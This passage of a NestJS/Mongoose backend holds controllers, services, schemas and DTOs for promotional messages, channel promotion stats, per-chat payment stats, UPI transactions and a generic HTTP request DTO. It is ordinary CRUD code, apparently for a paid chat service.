false, autoIndex: true,strict: false ,  timestamps: true,\n    toJSON: {\n      virtuals: true,\n      transform: (doc, ret) => {\n        delete ret._id;\n      },\n    },})\nexport class PromoteMsg {}\n\nexport const PromoteMsgSchema = SchemaFactory.createForClass(PromoteMsg);\nPromoteMsgSchema.add({ type: mongoose.Schema.Types.Mixed });\n\n","import { Injectable, NotFoundException } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport { PromoteMsg } from './promote-msgs.schema';\n\n@Injectable()\nexport class PromoteMsgsService {\n    constructor(@InjectModel('promotemsgModule') private promotemsgModel: Model<PromoteMsg>) {\n    }\n\n    async OnModuleInit() {\n        console.log(\"Config Module Inited\")\n    }\n\n    async findOne(): Promise<any> {\n        const user = (await this.promotemsgModel.findOne({}, { _id: 0 }).exec())?.toJSON();\n        if (!user) {\n            throw new NotFoundException(`promotemsgModel not found`);\n        }\n        return user;\n    }\n\n    async update(updateClientDto: any): Promise<any> {\n        delete updateClientDto['_id']\n        const updatedUser = await this.promotemsgModel.findOneAndUpdate(\n            {}, // Assuming you want to update the first document found in the collection\n            { $set: { ...updateClientDto } },\n            { new: true, upsert: true }\n        ).exec();\n        if (!updatedUser) {\n            throw new NotFoundException(`promotemsgModel not found`);\n        }\n        return updatedUser;\n    }\n\n}\n","// create-promote-stat.dto.ts\nimport { ApiProperty } from '@nestjs/swagger';\n\nexport class CreatePromoteStatDto {\n  @ApiProperty({ example: 'shruthi1', description: 'Client ID' })\n  client: string;\n\n  @ApiProperty({ example: { \"Girls_Chating_Group_07\": 4, \"girls_friends_chatting_group_01\": 14 }, description: 'Data' })\n  data: Map<string, number>;\n\n  @ApiProperty({ example: 552, description: 'Total Count' })\n  totalCount: number;\n\n  @ApiProperty({ example: 314, description: 'Unique Channels' })\n  uniqueChannels: number;\n\n  @ApiProperty({ example: 1719929752982.0, description: 'Release Day' })\n  releaseDay: number;\n\n  @ApiProperty({ example: 1719860106247.0, description: 'Last Updated TimeStamp' })\n  lastUpdatedTimeStamp: number;\n\n  @ApiProperty({ example: true, description: 'Is Active' })\n  isActive: boolean;\n\n  @ApiProperty({ example: [\"And_Girls_Boys_Group_Chatting\", \"Girls_Chating_Group_07\"], description: 'Channels' })\n  channels: string[];\n}\n","// update-promote-stat.dto.ts\nimport { PartialType } from '@nestjs/swagger';\nimport { CreatePromoteStatDto } from './create-promote-stat.dto';\n\nexport class UpdatePromoteStatDto extends PartialType(CreatePromoteStatDto) {}\n","import { Body, Controller, Delete, Get, Param, Post, Put } from '@nestjs/common';\nimport { ApiTags } from '@nestjs/swagger';\nimport { PromoteStatService } from './promote-stat.service';\nimport { CreatePromoteStatDto } from './dto/create-promote-stat.dto';\nimport { UpdatePromoteStatDto } from './dto/update-promote-stat.dto';\n\n@ApiTags('promote-stats')\n@Controller('promote-stats')\nexport class PromoteStatController {\n  constructor(private readonly promoteStatService: PromoteStatService) {}\n\n  @Post()\n  async create(@Body() createPromoteStatDto: CreatePromoteStatDto) {\n    return this.promoteStatService.create(createPromoteStatDto);\n  }\n\n  @Get(':client')\n  async findByClient(@Param('client') client: string) {\n    return this.promoteStatService.findByClient(client);\n  }\n\n  @Put(':client')\n  async update(\n    @Param('client') client: string,\n    @Body() updatePromoteStatDto: UpdatePromoteStatDto,\n  ) {\n    return this.promoteStatService.update(client, updatePromoteStatDto);\n  }\n\n  @Delete(':client')\n  async deleteOne(@Param('client') client: string) {\n    return this.promoteStatService.deleteOne(client);\n  }\n\n  @Delete()\n  async deleteAll() {\n    return this.promoteStatService.deleteAll();\n  }\n}\n","import { initModule } from './../ConfigurationInit/init.module';\nimport { Module } from '@nestjs/common';\nimport { MongooseModule } from '@nestjs/mongoose';\nimport { PromoteStatService } from './promote-stat.service';\nimport { PromoteStatController } from './promote-stat.controller';\nimport { PromoteStat, PromoteStatSchema } from './schemas/promote-stat.schema';\nimport { ClientModule } from '../clients/client.module';\n\n@Module({\n  imports: [initModule,\n    MongooseModule.forFeature([{ name: PromoteStat.name, collection: \"promoteStats\", schema: PromoteStatSchema }]),\n    ClientModule\n  ],\n  controllers: [PromoteStatController],\n  providers: [PromoteStatService],\n  exports: [PromoteStatService]\n})\nexport class PromoteStatModule { }\n","import { Inject, Injectable, NotFoundException, forwardRef } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport { CreatePromoteStatDto } from './dto/create-promote-stat.dto';\nimport { UpdatePromoteStatDto } from './dto/update-promote-stat.dto';\nimport { PromoteStat, PromoteStatDocument } from './schemas/promote-stat.schema';\nimport { ClientService } from '../clients/client.service';\n\n@Injectable()\nexport class PromoteStatService {\n  constructor(@InjectModel(PromoteStat.name) private promoteStatModel: Model<PromoteStatDocument>,\n    @Inject(forwardRef(() => ClientService))\n    private clientService: ClientService,) { }\n\n  async create(createPromoteStatDto: CreatePromoteStatDto): Promise<PromoteStat> {\n    const createdPromoteStat = new this.promoteStatModel(createPromoteStatDto);\n    return createdPromoteStat.save();\n  }\n\n  async findAll(): Promise<PromoteStat[]> {\n    const promoteStat = await this.promoteStatModel.find().sort({ totalCount: -1 }).exec();\n    return promoteStat;\n  }\n\n\n  async findByClient(client: string): Promise<PromoteStat> {\n    const promoteStat = await this.promoteStatModel.findOne({ client }).exec()\n    if (!promoteStat) {\n      throw new NotFoundException(`PromoteStat not found for client ${client}`);\n    }\n    return promoteStat;\n  }\n\n  async update(client: string, updatePromoteStatDto: UpdatePromoteStatDto): Promise<PromoteStat> {\n    const promoteStat = await this.promoteStatModel.findOneAndUpdate({ client }, updatePromoteStatDto, { new: true }).exec();\n    if (!promoteStat) {\n      throw new NotFoundException(`PromoteStat not found for client ${client}`);\n    }\n    return promoteStat;\n  }\n\n  async deleteOne(client: string): Promise<void> {\n    const result = await this.promoteStatModel.deleteOne({ client }).exec();\n    if (result.deletedCount === 0) {\n      throw new NotFoundException(`PromoteStat not found for client ${client}`);\n    }\n  }\n\n  async deleteAll(): Promise<void> {\n    await this.promoteStatModel.deleteMany({}).exec();\n  }\n\n  async reinitPromoteStats() {\n    const users = await this.findAll()\n    for (const user of users) {\n      await this.promoteStatModel.updateOne({ client: user.client },\n        {\n          $set: {\n            totalCount: 0,\n            uniqueChannels: 0,\n            releaseDay: Date.now(),\n            lastUpdatedTimeStamp: Date.now(),\n            data: {}//Object.fromEntries((await this.promoteStatModel.findOne({ client: user.client })).channels?.map(channel => [channel, 0])),\n          }\n        }\n      );\n    }\n  }\n}\n","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\nimport { ApiProperty } from '@nestjs/swagger';\nimport { Document } from 'mongoose';\n\nexport type PromoteStatDocument = PromoteStat & Document;\n\n@Schema()\nexport class PromoteStat {\n  @ApiProperty({ example: 'shruthi1', description: 'Client ID' })\n  @Prop({ required: true, unique: true })\n  client: string;\n\n  @ApiProperty({ example: { \"Girls_Chating_Group_07\": 4, \"girls_friends_chatting_group_01\": 14 }, description: 'Data' })\n  @Prop({ required: true, type: Map, of: Number })\n  data: Map<string, number>;\n\n  @ApiProperty({ example: 552, description: 'Total Count' })\n  @Prop({ required: true })\n  totalCount: number;\n\n  @ApiProperty({ example: 314, description: 'Unique Channels' })\n  @Prop({ required: true })\n  uniqueChannels: number;\n\n  @ApiProperty({ example: 1719929752982.0, description: 'Release Day' })\n  @Prop({ required: true })\n  releaseDay: number;\n\n  @ApiProperty({ example: true, description: 'Is Active' })\n  @Prop({ required: true })\n  isActive: boolean;\n\n  @ApiProperty({ example: 1719929752982.0, description: 'Last Updated TimeStamp' })\n  @Prop({ required: true })\n  lastUpdatedTimeStamp: number;\n\n  @ApiProperty({ example: [\"And_Girls_Boys_Group_Chatting\", \"Girls_Chating_Group_07\"], description: 'Channels' })\n  @Prop({ required: true, type: [String] })\n  channels: string[];\n}\n\nexport const PromoteStatSchema = SchemaFactory.createForClass(PromoteStat);\n","import { IsOptional, IsEnum, IsObject, IsUrl, IsNumber, Min, Max } from 'class-validator';\r\nimport { ApiProperty, ApiPropertyOptional } from '@nestjs/swagger';\r\nimport { Method } from 'axios';\r\nimport { Transform } from 'class-transformer';\r\n\r\nenum ResponseType {\r\n    JSON = 'json',\r\n    TEXT = 'text',\r\n    STREAM = 'stream',\r\n    BLOB = 'blob',\r\n    DOCUMENT = 'document',\r\n    ARRAYBUFFER = 'arraybuffer'\r\n}\r\n\r\nexport class ExecuteRequestDto {\r\n    @ApiProperty({ description: 'The URL to send the request to' })\r\n    @IsUrl({}, { message: 'Please provide a valid URL' })\r\n    url: string;\r\n\r\n    @ApiPropertyOptional({ enum: ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'HEAD', 'OPTIONS'], default: 'GET' })\r\n    @IsEnum(['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'HEAD', 'OPTIONS'] as const)\r\n    @IsOptional()\r\n    method?: Method;\r\n\r\n    @ApiPropertyOptional({ type: Object, additionalProperties: { type: \"string\" } })\r\n    @IsObject()\r\n    @IsOptional()\r\n    headers?: Record<string, string>;\r\n\r\n    @ApiPropertyOptional({ description: 'Request body data' })\r\n    @IsOptional()\r\n    data?: any;\r\n\r\n    @ApiPropertyOptional({ type: Object, additionalProperties: { type: 'string' } })\r\n    @IsObject()\r\n    @IsOptional()\r\n    params?: Record<string, string>;\r\n\r\n    @ApiPropertyOptional({ enum: ResponseType, default: ResponseType.JSON })\r\n    @IsEnum(ResponseType)\r\n    @IsOptional()\r\n    responseType?: ResponseType;\r\n\r\n    @ApiPropertyOptional({ description: 'Request timeout in milliseconds', default: 30000, minimum: 1000, maximum: 300000 })\r\n    @IsNumber()\r\n    @Min(1000)\r\n    @Max(300000)\r\n    @IsOptional()\r\n    @Transform(({ value }) => parseInt(value))\r\n    timeout?: number;\r\n\r\n    @ApiPropertyOptional({ description: 'Whether to follow redirects', default: true })\r\n    @IsOptional()\r\n    @Transform(({ value }) => value === 'true' || value === true)\r\n    followRedirects?: boolean;\r\n\r\n    @ApiPropertyOptional({ description: 'Maximum number of redirects to follow', default: 5, minimum: 0, maximum: 10 })\r\n    @IsNumber()\r\n    @Min(0)\r\n    @Max(10)\r\n    @IsOptional()\r\n    @Transform(({ value }) => parseInt(value))\r\n    maxRedirects?: number;\r\n}","// create-stat.dto.ts\nimport { ApiProperty } from '@nestjs/swagger';\n\nexport class CreateStatDto {\n  @ApiProperty({ example: '6785668464', description: 'Chat ID' })\n  chatId: string;\n\n  @ApiProperty({ example: 12, description: 'Count' })\n  count: number;\n\n  @ApiProperty({ example: 50, description: 'Pay Amount' })\n  payAmount: number;\n\n  @ApiProperty({ example: true, description: 'Demo Given' })\n  demoGiven: boolean;\n\n  @ApiProperty({ example: true, description: 'Demo Given Today' })\n  demoGivenToday: boolean;\n\n  @ApiProperty({ example: false, description: 'New User' })\n  newUser: boolean;\n\n  @ApiProperty({ example: true, description: 'Paid Reply' })\n  paidReply: boolean;\n\n  @ApiProperty({ example: 'Amaan Khan', description: 'Name' })\n  name: string;\n\n  @ApiProperty({ example: false, description: 'Second Show' })\n  secondShow: boolean;\n\n  @ApiProperty({ example: null, description: 'Did Pay' })\n  didPay: boolean | null;\n\n  @ApiProperty({ example: 'shruthi1', description: 'Client' })\n  client: string;\n\n  @ApiProperty({ example: 'shruthi', description: 'Profile' })\n  profile: string;\n}\n","import { Body, Controller, Delete, Get, Param, Post, Put } from '@nestjs/common';\nimport { ApiTags } from '@nestjs/swagger';\nimport { StatService } from './stat.service';\nimport { CreateStatDto } from './create-stat.dto';\nimport { UpdateStatDto } from './update-stat.dto';\n\n@ApiTags('stats')\n@Controller('stats')\nexport class StatController {\n  constructor(private readonly statService: StatService) {}\n\n  @Post()\n  async create(@Body() createStatDto: CreateStatDto) {\n    return this.statService.create(createStatDto);\n  }\n\n  @Get(':chatId/:profile')\n  async findByChatIdAndProfile(@Param('chatId') chatId: string, @Param('profile') profile: string) {\n    return this.statService.findByChatIdAndProfile(chatId, profile);\n  }\n\n  @Put(':chatId/:profile')\n  async update(\n    @Param('chatId') chatId: string,\n    @Param('profile') profile: string,\n    @Body() updateStatDto: UpdateStatDto,\n  ) {\n    return this.statService.update(chatId, profile, updateStatDto);\n  }\n\n  @Delete(':chatId/:profile')\n  async deleteOne(@Param('chatId') chatId: string, @Param('profile') profile: string) {\n    return this.statService.deleteOne(chatId, profile);\n  }\n\n  @Delete()\n  async deleteAll() {\n    return this.statService.deleteAll();\n  }\n}\n","import { Module } from '@nestjs/common';\nimport { MongooseModule } from '@nestjs/mongoose';\nimport { StatService } from './stat.service';\nimport { StatController } from './stat.controller';\nimport { StatSchema } from './stat.schema';\nimport { initModule } from '../ConfigurationInit/init.module';\n\n@Module({\n    imports: [\n        initModule,\n        MongooseModule.forFeature([{ name: \"StatsModule\", collection: \"stats\", schema: StatSchema }])],\n    controllers: [StatController],\n    providers: [StatService],\n    exports:[StatService]\n})\nexport class StatModule { }\n","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\nimport { ApiProperty } from '@nestjs/swagger';\nimport { Document } from 'mongoose';\n\nexport type StatDocument = Stat & Document;\n\n@Schema()\nexport class Stat {\n  @ApiProperty({ example: '6785668464', description: 'Chat ID' })\n  @Prop({ required: true })\n  chatId: string;\n\n  @ApiProperty({ example: 12, description: 'Count' })\n  @Prop({ required: true })\n  count: number;\n\n  @ApiProperty({ example: 50, description: 'Pay Amount' })\n  @Prop({ required: true })\n  payAmount: number;\n\n  @ApiProperty({ example: true, description: 'Demo Given' })\n  @Prop({ required: true })\n  demoGiven: boolean;\n\n  @ApiProperty({ example: true, description: 'Demo Given Today' })\n  @Prop({ required: true })\n  demoGivenToday: boolean;\n\n  @ApiProperty({ example: false, description: 'New User' })\n  @Prop({ required: true })\n  newUser: boolean;\n\n  @ApiProperty({ example: true, description: 'Paid Reply' })\n  @Prop({ required: true })\n  paidReply: boolean;\n\n  @ApiProperty({ example: 'Amaan Khan', description: 'Name' })\n  @Prop({ required: true })\n  name: string;\n\n  @ApiProperty({ example: false, description: 'Second Show' })\n  @Prop({ required: true })\n  secondShow: boolean;\n\n  @ApiProperty({ example: null, description: 'Did Pay' })\n  @Prop({ required: false })\n  didPay: boolean | null;\n\n  @ApiProperty({ example: 'shruthi1', description: 'Client' })\n  @Prop({ required: true })\n  client: string;\n\n  @ApiProperty({ example: 'shruthi', description: 'Profile' })\n  @Prop({ required: true })\n  profile: string;\n}\n\nexport const StatSchema = SchemaFactory.createForClass(Stat);\nStatSchema.index({ chatId: 1, profile: 1, client: 1 }, { unique: true });\n","import { Injectable, NotFoundException } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport { CreateStatDto } from './create-stat.dto';\nimport { UpdateStatDto } from './update-stat.dto';\nimport { Stat, StatDocument } from './stat.schema';\n\n@Injectable()\nexport class StatService {\n  constructor(@InjectModel(\"StatsModule\") private statModel: Model<StatDocument>) {}\n\n  async create(createStatDto: CreateStatDto): Promise<Stat> {\n    const createdStat = new this.statModel(createStatDto);\n    return createdStat.save();\n  }\n\n  async findAll(): Promise<Stat[]> {\n    const stats = await this.statModel.find().exec();\n    return stats;\n  }\n\n  async findByChatIdAndProfile(chatId: string, profile: string): Promise<Stat> {\n    const stat = await this.statModel.findOne({ chatId, profile }).exec();\n    if (!stat) {\n      throw new NotFoundException(`Stat not found for chatId ${chatId} and profile ${profile}`);\n    }\n    return stat;\n  }\n\n  async update(chatId: string, profile: string, updateStatDto: UpdateStatDto): Promise<Stat> {\n    const stat = await this.statModel.findOneAndUpdate({ chatId, profile }, updateStatDto, { new: true }).exec();\n    if (!stat) {\n      throw new NotFoundException(`Stat not found for chatId ${chatId} and profile ${profile}`);\n    }\n    return stat;\n  }\n\n  async deleteOne(chatId: string, profile: string): Promise<void> {\n    const result = await this.statModel.deleteOne({ chatId, profile }).exec();\n    if (result.deletedCount === 0) {\n      throw new NotFoundException(`Stat not found for chatId ${chatId} and profile ${profile}`);\n    }\n  }\n\n  async deleteAll(): Promise<void> {\n    await this.statModel.deleteMany({}).exec();\n  }\n}\n","// update-stat.dto.ts\nimport { PartialType } from '@nestjs/swagger';\nimport { CreateStatDto } from './create-stat.dto';\n\nexport class UpdateStatDto extends PartialType(CreateStatDto) {}\n","// create-stat.dto.ts\nimport { ApiProperty } from '@nestjs/swagger';\n\nexport class CreateStatDto {\n  @ApiProperty({ example: '6785668464', description: 'Chat ID' })\n  chatId: string;\n\n  @ApiProperty({ example: 12, description: 'Count' })\n  count: number;\n\n  @ApiProperty({ example: 50, description: 'Pay Amount' })\n  payAmount: number;\n\n  @ApiProperty({ example: true, description: 'Demo Given' })\n  demoGiven: boolean;\n\n  @ApiProperty({ example: true, description: 'Demo Given Today' })\n  demoGivenToday: boolean;\n\n  @ApiProperty({ example: false, description: 'New User' })\n  newUser: boolean;\n\n  @ApiProperty({ example: true, description: 'Paid Reply' })\n  paidReply: boolean;\n\n  @ApiProperty({ example: 'Amaan Khan', description: 'Name' })\n  name: string;\n\n  @ApiProperty({ example: false, description: 'Second Show' })\n  secondShow: boolean;\n\n  @ApiProperty({ example: null, description: 'Did Pay' })\n  didPay: boolean | null;\n\n  @ApiProperty({ example: 'shruthi1', description: 'Client' })\n  client: string;\n\n  @ApiProperty({ example: 'shruthi', description: 'Profile' })\n  profile: string;\n}\n","import { Body, Controller, Delete, Get, Param, Post, Put } from '@nestjs/common';\nimport { ApiTags } from '@nestjs/swagger';\nimport { Stat2Service } from './stat2.service';\nimport { CreateStatDto } from './create-stat2.dto';\nimport { UpdateStatDto } from './update-stat2.dto';\n\n@ApiTags('stats2')\n@Controller('stats2')\nexport class Stat2Controller {\n  constructor(private readonly statService: Stat2Service) {}\n\n  @Post()\n  async create(@Body() createStatDto: CreateStatDto) {\n    return this.statService.create(createStatDto);\n  }\n\n  @Get(':chatId/:profile')\n  async findByChatIdAndProfile(@Param('chatId') chatId: string, @Param('profile') profile: string) {\n    return this.statService.findByChatIdAndProfile(chatId, profile);\n  }\n\n  @Put(':chatId/:profile')\n  async update(\n    @Param('chatId') chatId: string,\n    @Param('profile') profile: string,\n    @Body() updateStatDto: UpdateStatDto,\n  ) {\n    return this.statService.update(chatId, profile, updateStatDto);\n  }\n\n  @Delete(':chatId/:profile')\n  async deleteOne(@Param('chatId') chatId: string, @Param('profile') profile: string) {\n    return this.statService.deleteOne(chatId, profile);\n  }\n\n  @Delete()\n  async deleteAll() {\n    return this.statService.deleteAll();\n  }\n}\n","import { Module } from '@nestjs/common';\nimport { MongooseModule } from '@nestjs/mongoose';\nimport { Stat2Service } from './stat2.service';\nimport { Stat2Controller } from './stat2.controller';\nimport { StatSchema } from './stat2.schema';\nimport { initModule } from '../ConfigurationInit/init.module';\n\n@Module({\n    imports: [\n        initModule,\n        MongooseModule.forFeature([{ name: \"Stats2Module\", collection: \"stats2\", schema: StatSchema }])],\n    controllers: [Stat2Controller],\n    providers: [Stat2Service],\n    exports: [Stat2Service]\n})\nexport class Stat2Module { }\n","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\nimport { ApiProperty } from '@nestjs/swagger';\nimport { Document } from 'mongoose';\n\nexport type Stat2Document = Stat2 & Document;\n\n@Schema()\nexport class Stat2 {\n  @ApiProperty({ example: '6785668464', description: 'Chat ID' })\n  @Prop({ required: true })\n  chatId: string;\n\n  @ApiProperty({ example: 12, description: 'Count' })\n  @Prop({ required: true })\n  count: number;\n\n  @ApiProperty({ example: 50, description: 'Pay Amount' })\n  @Prop({ required: true })\n  payAmount: number;\n\n  @ApiProperty({ example: true, description: 'Demo Given' })\n  @Prop({ required: true })\n  demoGiven: boolean;\n\n  @ApiProperty({ example: true, description: 'Demo Given Today' })\n  @Prop({ required: true })\n  demoGivenToday: boolean;\n\n  @ApiProperty({ example: false, description: 'New User' })\n  @Prop({ required: true })\n  newUser: boolean;\n\n  @ApiProperty({ example: true, description: 'Paid Reply' })\n  @Prop({ required: true })\n  paidReply: boolean;\n\n  @ApiProperty({ example: 'Amaan Khan', description: 'Name' })\n  @Prop({ required: true })\n  name: string;\n\n  @ApiProperty({ example: false, description: 'Second Show' })\n  @Prop({ required: true })\n  secondShow: boolean;\n\n  @ApiProperty({ example: null, description: 'Did Pay' })\n  @Prop({ required: false })\n  didPay: boolean | null;\n\n  @ApiProperty({ example: 'shruthi1', description: 'Client' })\n  @Prop({ required: true })\n  client: string;\n\n  @ApiProperty({ example: 'shruthi', description: 'Profile' })\n  @Prop({ required: true })\n  profile: string;\n}\n\nexport const StatSchema = SchemaFactory.createForClass(Stat2);\nStatSchema.index({ chatId: 1, profile: 1, client: 1 }, { unique: true });\n","import { Injectable, NotFoundException } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport { CreateStatDto } from './create-stat2.dto';\nimport { UpdateStatDto } from './update-stat2.dto';\nimport { Stat2, Stat2Document } from './stat2.schema';\n\n@Injectable()\nexport class Stat2Service {\n  constructor(@InjectModel(\"Stats2Module\") private statModel: Model<Stat2Document>) {}\n\n  async create(createStatDto: CreateStatDto): Promise<Stat2> {\n    const createdStat = new this.statModel(createStatDto);\n    return createdStat.save();\n  }\n\n  async findByChatIdAndProfile(chatId: string, profile: string): Promise<Stat2> {\n    const stat = await this.statModel.findOne({ chatId, profile }).exec();\n    if (!stat) {\n      throw new NotFoundException(`Stat not found for chatId ${chatId} and profile ${profile}`);\n    }\n    return stat;\n  }\n\n  async update(chatId: string, profile: string, updateStatDto: UpdateStatDto): Promise<Stat2> {\n    const stat = await this.statModel.findOneAndUpdate({ chatId, profile }, updateStatDto, { new: true }).exec();\n    if (!stat) {\n      throw new NotFoundException(`Stat not found for chatId ${chatId} and profile ${profile}`);\n    }\n    return stat;\n  }\n\n  async findAll(): Promise<Stat2[]> {\n    const stats = await this.statModel.find().exec();\n    return stats;\n  }\n\n  async deleteOne(chatId: string, profile: string): Promise<void> {\n    const result = await this.statModel.deleteOne({ chatId, profile }).exec();\n    if (result.deletedCount === 0) {\n      throw new NotFoundException(`Stat not found for chatId ${chatId} and profile ${profile}`);\n    }\n  }\n\n  async deleteAll(): Promise<void> {\n    await this.statModel.deleteMany({}).exec();\n  }\n}\n","// update-stat.dto.ts\nimport { PartialType } from '@nestjs/swagger';\nimport { CreateStatDto } from './create-stat2.dto';\n\nexport class UpdateStatDto extends PartialType(CreateStatDto) {}\n","import { ApiProperty, ApiPropertyOptional } from '@nestjs/swagger';\nimport { IsString, IsNumber, IsOptional } from 'class-validator';\n\nexport class CreateTransactionDto {\n  @ApiProperty({ description: 'Unique transaction ID (UTR).' })\n  @IsString()\n  transactionId: string;\n\n  @ApiProperty({ description: 'Amount involved in the transaction.' })\n  @IsNumber()\n  amount: number;\n\n  @ApiProperty({ description: 'Issue type reported by the user.' })\n  @IsString()\n  issue: string;\n\n  @ApiProperty({ description: 'Description of issue reported by the user.' })\n  @IsString()\n  description: string;\n\n  @ApiPropertyOptional({\n    description: 'Refund method selected by the user.',\n    required: false\n  })\n  @IsString()\n  @IsOptional()\n  refundMethod?: string;\n\n  @ApiPropertyOptional({ description: 'User profile ID.', required: false })\n  @IsString()\n  @IsOptional()\n  profile: string = \"undefined\";\n\n  @ApiPropertyOptional({ description: 'User chat ID.', })\n  @IsString()\n  @IsOptional()\n  chatId: string = \"undefined\";\n\n  @ApiPropertyOptional({ description: 'IP address of the user.', required: false })\n  @IsString()\n  @IsOptional()\n  ip: string = \"undefined\";\n\n  @ApiPropertyOptional({ description: 'Transaction status.', required: false })\n  @IsString()\n  @IsOptional()\n  status: string = \"pending\";\n}\n","import { PartialType } from '@nestjs/swagger';\nimport { CreateTransactionDto } from './create-transaction.dto';\n\nexport class UpdateTransactionDto extends PartialType(CreateTransactionDto) {}","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\nimport { Document } from 'mongoose';\n\n@Schema({ timestamps: true })\nexport class Transaction extends Document {\n  @Prop({ required: false })\n  transactionId: string;\n\n  @Prop({ required: false })\n  amount: number;\n\n  @Prop({ required: false })\n  issue: string;\n\n  @Prop({ required: false })\n  description: string;\n\n  @Prop({ required: false })\n  refundMethod?: string;\n\n  @Prop({ required: false })\n  profile: string;\n\n  @Prop({ required: false })\n  chatId: string;\n\n  @Prop({ required: false })\n  ip: string;\n\n  @Prop({ required: false, default: 'pending' })\n  status: string;\n}\n\nexport const TransactionSchema = SchemaFactory.createForClass(Transaction);\n","import { Body, Controller, Get, Post, Put, Delete, Param, Query } from '@nestjs/common';\nimport { ApiTags, ApiOperation, ApiResponse } from '@nestjs/swagger';\nimport { CreateTransactionDto } from './dto/create-transaction.dto';\nimport { UpdateTransactionDto } from './dto/update-transaction.dto';\nimport { TransactionService } from './transaction.service';\n\n@ApiTags('Transactions')\n@Controller('transactions')\nexport class TransactionController {\n  constructor(private readonly transactionService: TransactionService) {}\n\n  @Post()\n  @ApiOperation({ summary: 'Create a new transaction' })\n  @ApiResponse({ status: 201, description: 'Transaction created successfully.' })\n  @ApiResponse({ status: 400, description: 'Invalid input.' })\n  async create(@Body() createTransactionDto: CreateTransactionDto) {\n    return this.transactionService.create(createTransactionDto);\n  }\n\n  @Get(':id')\n  @ApiOperation({ summary: 'Get transaction by ID' })\n  @ApiResponse({ status: 200, description: 'Transaction retrieved successfully.' })\n  @ApiResponse({ status: 404, description: 'Transaction not found.' })\n  async findOne(@Param('id') id: string) {\n    return this.transactionService.findOne(id);\n  }\n\n  @Get()\n  @ApiOperation({ summary: 'Get all transactions or search transactions' })\n  @ApiResponse({ status: 200, description: 'Transactions retrieved successfully.' })\n  async findAll(\n    @Query('search') search?: string,\n    @Query('limit') limit?: number,\n    @Query('offset') offset?: number,\n  ) {\n    return this.transactionService.findAll(search, limit, offset);\n  }\n\n  @Put(':id')\n  @ApiOperation({ summary: 'Update a transaction by ID' })\n  @ApiResponse({ status: 200, description: 'Transaction updated successfully.' })\n  @ApiResponse({ status: 404, description: 'Transaction not found.' })\n  async update(\n    @Param('id') id: string,\n    @Body() updateTransactionDto: UpdateTransactionDto,\n  ) {\n    return this.transactionService.update(id, updateTransactionDto);\n  }\n\n  @Delete(':id')\n  @ApiOperation({ summary: 'Delete a transaction by ID' })\n  @ApiResponse({ status: 200, description: 'Transaction deleted successfully.' })\n  @ApiResponse({ status: 404, description: 'Transaction not found.' })\n  async delete(@Param('id') id: string) {\n    return this.transactionService.delete(id);\n  }\n}\n","import { Module } from '@nestjs/common';\nimport { MongooseModule } from '@nestjs/mongoose';\nimport { TransactionService } from './transaction.service';\nimport { TransactionController } from './transaction.controller';\nimport { Transaction, TransactionSchema } from './schemas/transaction.schema';\n\n@Module({\n  imports: [\n    MongooseModule.forFeature([\n      { name: Transaction.name, schema: TransactionSchema },\n    ]),\n  ],\n  controllers: [TransactionController],\n  providers: [TransactionService],\n  exports:[TransactionService]\n})\nexport class TransactionModule {}\n","import { Injectable, NotFoundException } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport { CreateTransactionDto } from './dto/create-transaction.dto';\nimport { UpdateTransactionDto } from './dto/update-transaction.dto';\nimport { Transaction } from './schemas/transaction.schema';\n\n@Injectable()\nexport class TransactionService {\n  constructor(\n    @InjectModel(Transaction.name) private readonly transactionModel: Model<Transaction>,\n  ) {}\n\n  async create(createTransactionDto: CreateTransactionDto): Promise<Transaction> {\n    console.log('createTransactionDto', createTransactionDto);\n    const newTransaction = new this.transactionModel(createTransactionDto);\n    return await newTransaction.save();\n  }\n\n  async findOne(id: string): Promise<Transaction> {\n    const transaction = await this.transactionModel.findById(id).exec();\n    if (!transaction) {\n      throw new NotFoundException('Transaction not found');\n    }\n    return transaction;\n  }\n\n  async findAll(\n    search?: string,\n    limit = 10,\n    offset = 0,\n  ): Promise<{ transactions: Transaction[]; total: number }> {\n    const query = search\n      ? {\n          $or: [\n            { transactionId: { $regex: search, $options: 'i' } },\n            { issue: { $regex: search, $options: 'i' } },\n            { profile: { $regex: search, $options: 'i' } },\n            { chatId: { $regex: search, $options: 'i' } },\n          ],\n        }\n      : {};\n\n    const transactions = await this.transactionModel\n      .find(query)\n      .skip(offset)\n      .limit(limit)\n      .exec();\n    const total = await this.transactionModel.countDocuments(query).exec();\n\n    return { transactions, total };\n  }\n\n  async update(id: string, updateTransactionDto: UpdateTransactionDto): Promise<Transaction> {\n    const updatedTransaction = await this.transactionModel\n      .findByIdAndUpdate(id, updateTransactionDto, { new: true })\n      .exec();\n    if (!updatedTransaction) {\n      throw new NotFoundException('Transaction not found');\n    }\n    return updatedTransaction;\n  }\n\n  async delete(id: string): Promise<Transaction> {\n    const deletedTransaction = await this.transactionModel.findByIdAndDelete(id).exec();\n    if (!deletedTransaction) {\n      throw new NotFoundException('Transaction not found');\n    }\n    return deletedTransaction;\n  }\n}\n","import { Controller, Get, Body, Patch } from '@nestjs/common';\nimport { ApiTags, ApiOperation, ApiBody } from '@nestjs/swagger';\nimport { UpiIdService } from './upi-ids.service';\n\n@ApiTags('UPI Ids')\n@Controller('upi-ids')\nexport class UpiIdController {\n  constructor(private readonly UpiIdService: UpiIdService) { }\n\n  @Get()\n  @ApiOperation({ summary: 'Get Upi Ids' })\n  async findOne(): Promise<any> {\n    return this.UpiIdService.findOne();\n  }\n\n  @Patch()\n  @ApiOperation({ summary: 'Update Upi Ids' })\n  @ApiBody({ type: Object })\n  async update(@Body() updateUpiIdsdto: any): Promise<any> {\n    return this.UpiIdService.update(updateUpiIdsdto);\n  }\n\n}\n","import { Module, Global } from '@nestjs/common';\nimport { MongooseModule } from '@nestjs/mongoose';\nimport { UpiIdService } from './upi-ids.service';\nimport { UpiIdController } from './upi-ids.controller';\nimport { 